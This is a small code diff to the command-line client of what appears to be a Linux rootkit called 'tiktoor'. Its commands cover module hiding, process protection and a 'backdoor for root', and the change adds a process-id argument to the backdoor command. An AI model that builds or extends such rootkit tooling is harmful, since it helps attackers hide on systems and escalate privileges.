@@ -36,7 +36,11 @@ enum Cli {
     /// Unhide tiktoor module
     ModuleUnhiding,
     /// Backdoor for root
-    BackdoorForRoot,
+    BackdoorForRoot {
+        /// Process pid
+        #[structopt(short, long)]
+        pid: u32,
+    },
 }
 
 /// Port hiding transmission type
@@ -71,6 +75,6 @@ fn main() {
         Cli::ProcessProtection { pid } => tiktoor_client::protect_process(pid),
         Cli::ModuleHiding => tiktoor_client::hide_module(),
         Cli::ModuleUnhiding => tiktoor_client::unhide_module(),
-        Cli::BackdoorForRoot => tiktoor_client::backdoor_for_root(),
+        Cli::BackdoorForRoot { pid } => tiktoor_client::backdoor_for_root(pid),
     }
 }
